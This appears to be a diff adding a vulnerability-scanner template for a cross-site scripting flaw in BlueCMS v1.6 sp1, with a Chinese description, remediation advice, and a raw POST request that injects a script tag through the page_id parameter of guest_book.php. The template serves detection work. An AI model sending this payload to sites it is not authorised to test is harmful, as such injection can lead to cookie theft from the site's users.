@@ -1,0 +1,26 @@
+id: BlueCMS_v1-guest-book-XSS
+info:
+  name: BlueCMS v1.6 sp1 guest_book.php的page_id参数导致XSS漏洞
+  author:
+  - jim2g
+  description: |-
+    BlueCMS v1.6 sp1 guest_book.php的page_id参数导致XSS漏洞
+    BlueCMS是一款由开源组合PHP＋MYSQL开发的专业地方门户系统，专注于地方门户CMS。
+
+    bluecms v1.6存在XSS漏洞，攻击者可以利用该漏洞获取用户的COOKIE。
+  severity: high
+  remediation: "官方修复方案：\n1、建议用户到官方获取最新补丁或者最新版本程序：\nhttp://www.bluecms.net/ \n临时修复方案：\n1、对输入(和URL参数)进行过滤，对输出进行编码，白名单和黑名单结合。也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。虽然对输入过滤可以被绕过，但是也还是会拦截很大一部分的XSS攻击；最后对字符进行白名单或者黑名单限制。'\n"
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,"<script>prompt(/XSS/)</script>")
+  raw:
+  - |
+    POST /guest_book.php?page_id=2 HTTP/1.1
+    Host: {{Hostname}}
+
+    act=send&content=1&page_id=2%22><script>prompt(/XSS/)</script>&rid=
+  req-condition: true
